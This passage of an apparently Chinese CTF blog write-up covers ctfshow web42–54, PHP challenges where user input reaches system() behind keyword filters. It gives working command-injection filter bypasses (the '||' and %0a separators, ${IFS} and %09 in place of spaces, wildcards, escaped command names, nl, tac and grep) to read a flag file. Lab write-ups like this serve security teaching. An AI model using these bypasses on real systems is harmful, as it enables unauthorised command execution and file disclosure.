+<h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>代码”&gt;/dev/null 2&gt;&amp;1”的意思是不对输出内容进行回显，我们通过“;”进行截断，回显出flag.</strong></p>
+<ul>
+<li>payload:</li>
+</ul>
+<p><strong>ls;</strong></p>
+<p><strong>cat flag.php;</strong></p>
+<h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a><strong>web43</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line"></span><br><span class="line">​    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>这题将;也过滤了，尝试使用管道符绕过，发现||可以，也可以使用换行符%0a进行绕过：</p>
+<p><strong>ls||</strong></p>
+<p><strong>tac flag.php||</strong></p>
+<h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><p><strong>代码”&gt;/dev/null 2&gt;&amp;1”的意思是不对输出内容进行回显，</strong>过滤了flag关键字，使用通配符绕过即可。过滤了;，使用||绕过。</p>
+<ul>
+<li>payload:</li>
+</ul>
+<p><strong>ls||</strong></p>
+<p><em><em>tac f</em>||</em>*   </p>
+<h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><p><strong>代码”&gt;/dev/null 2&gt;&amp;1”的意思是不对输出内容进行回显，</strong>过滤了flag关键字，使用通配符绕过即可。过滤了;，使用||绕过。过滤空格：</p>
+<ul>
+<li>空格过滤的绕过方式：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$数字</span><br><span class="line"><span class="variable">$IFS</span></span><br><span class="line">%<span class="number">20</span></span><br><span class="line">&lt;和&lt;&gt;</span><br><span class="line">%<span class="number">09</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用%09绕过：</p>
+<p><strong>ls||</strong></p>
+<p><em><em>tac%09f</em>||</em>*</p>
+<h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><p>过滤了;|cat|flag|空格|数字|$|*</p>
+<p>代码”&gt;/dev/null 2&gt;&amp;1”的意思是不对输出内容进行回显，“;”也被过滤了，我们使用命令分隔符“||”进行截断,过滤了flag,用通配符绕过，也可以使用换行符，多过滤了空格，%09绕过。过滤了*，用“？”代替。</p>
+<p><strong>ls||     //ls%0a</strong></p>
+<p><strong>tac%09fla?.php||    // tac%09fla?.php%0a</strong></p>
+<h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><p>过滤了|cat|flag|空格|$|*|more|less|head|sort|tail和;</p>
+<p>但是依然可以使用上一题的payload绕过：</p>
+<p><strong>ls||     //ls%0a</strong></p>
+<p><strong>tac%09fla?.php||    // tac%09fla?.php%0a</strong></p>
+<h3 id="web48-50"><a href="#web48-50" class="headerlink" title="web48-50"></a>web48-50</h3><p>使用如上一题的payload。</p>
+<h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a><strong>web51</strong></h3><p><strong>将%也过滤掉了,使用&lt;&gt;重定向符号进行绕过;对tac的绕过可以加\或者使用nl命令：</strong></p>
+<ul>
+<li><strong>payload:</strong></li>
+</ul>
+<p><strong>ta\c&lt;&gt;fla?.php||</strong></p>
+<h3 id="web52（读取根目录）"><a href="#web52（读取根目录）" class="headerlink" title="web52（读取根目录）"></a>web52（读取根目录）</h3><p><strong>将&gt;也过滤掉了，但是可以使用$，因此空格用${IFS}进行绕过，直接读取：</strong></p>
+<p><strong>ta\c${IFS}fla?.php||</strong></p>
+<p><strong>发现没有返回结果，查看一下根目录：</strong></p>
+<p><strong>ls${IFS}/</strong></p>
+<p><img src="10.png"></p>
+<p><strong>对flag进行读取：</strong></p>
+<p><strong>?c=nl${IFS}/fla\g||</strong></p>
+<h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a><strong>web53</strong></h3><ul>
+<li><strong>system()函数直接对传进来的参数c当做命令执行，过滤了tac,flag,%,*,空格以及很多读取文件的函数：使用通配符绕过</strong></li>
+</ul>
+<p><strong>nl${IFS}fla?.php</strong></p>
+<p><strong>ta\c${IFS}fla?.php</strong></p>
+<h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a><strong>web54</strong></h3><p>过滤了;|cat|flag|空格|数字|查看文件命令nl等|`|%|\x09(空格)|\x26(&amp;)|&lt;|&gt;</p>
+<ul>
+<li><strong>使用grep.在flag.php中查找带有show字符串的一行(因为flag的格式为ctfshow{})</strong></li>
+</ul>
+<p><strong>grep****从文件内容查找匹配指定字符串的行：</strong></p>
+<p>$ grep “被查找的字符串” 文件名</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=grep$&#123;IFS&#125;show$&#123;IFS&#125;fl?g.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="web55-56（写到另一篇博客了）"><a href="#web55-56（写到另一篇博客了）" class="headerlink" title="web55-56（写到另一篇博客了）"></a>web55-56（写到另一篇博客了）</h3>
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web29%EF%BC%88%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">web29（通配符绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web30%EF%BC%88%E5%8F%8D%E5%BC%95%E5%8F%B7%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">web30（反引号执行系统命令）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web31%EF%BC%88%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">web31（过滤空格）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web32%EF%BC%88%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%93%E5%90%88%E8%AF%BB%E5%8F%96%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">web32（利用文件包含结合读取）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web33%EF%BC%88%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%93%E5%90%88%E8%AF%BB%E5%8F%96%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">web33（利用文件包含结合读取）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web34-36"><span class="toc-number">6.</span> <span class="toc-text">web34-36</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#web34"><span class="toc-number">6.1.</span> <span class="toc-text">web34</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web35"><span class="toc-number">6.2.</span> <span class="toc-text">web35</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web36"><span class="toc-number">6.3.</span> <span class="toc-text">web36</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%83%BD%E4%BD%BF%E7%94%A8%E5%92%8C33%E4%B8%80%E6%A0%B7%E7%9A%84payload%EF%BC%9A"><span class="toc-number">6.4.</span> <span class="toc-text">都使用和33一样的payload：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web37%EF%BC%88%E5%88%A9%E7%94%A8PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%BF%9B%E8%A1%8C%E8%AF%BB%E5%8F%96%EF%BC%8C%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">web37（利用PHP伪协议进行读取，执行命令）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web38%EF%BC%88php%E7%9F%AD%E6%A0%87%E7%AD%BE%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">web38（php短标签）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web39"><span class="toc-number">9.</span> <span class="toc-text">web39</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web40%EF%BC%88%E6%97%A0%E5%8F%82%E6%95%B0rce-%E5%88%A9%E7%94%A8PHP%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-number">10.</span> <span class="toc-text">web40（无参数rce-利用PHP函数执行）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">10.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">10.2.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web41%EF%BC%88%E6%88%96%E8%BF%90%E7%AE%97-%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%E8%A7%A3%E9%A2%98%EF%BC%89"><span class="toc-number">11.</span> <span class="toc-text">web41（或运算-使用脚本解题）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90"><span class="toc-number">11.1.</span> <span class="toc-text">脚本分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-1"><span class="toc-number">11.2.</span> <span class="toc-text">解题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#yu%E5%B8%88%E5%82%85%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="toc-number">11.3.</span> <span class="toc-text">yu师傅的脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web42"><span class="toc-number">12.</span> <span class="toc-text">web42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web43"><span class="toc-number">13.</span> <span class="toc-text">web43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web44"><span class="toc-number">14.</span> <span class="toc-text">web44</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web45"><span class="toc-number">15.</span> <span class="toc-text">web45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web46"><span class="toc-number">16.</span> <span class="toc-text">web46</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web47"><span class="toc-number">17.</span> <span class="toc-text">web47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web48-50"><span class="toc-number">18.</span> <span class="toc-text">web48-50</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web51"><span class="toc-number">19.</span> <span class="toc-text">web51</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web52%EF%BC%88%E8%AF%BB%E5%8F%96%E6%A0%B9%E7%9B%AE%E5%BD%95%EF%BC%89"><span class="toc-number">20.</span> <span class="toc-text">web52（读取根目录）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web53"><span class="toc-number">21.</span> <span class="toc-text">web53</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web54"><span class="toc-number">22.</span> <span class="toc-text">web54</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web55-56%EF%BC%88%E5%86%99%E5%88%B0%E5%8F%A6%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E4%BA%86%EF%BC%89"><span class="toc-number">23.</span> <span class="toc-text">web55-56（写到另一篇博客了）</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
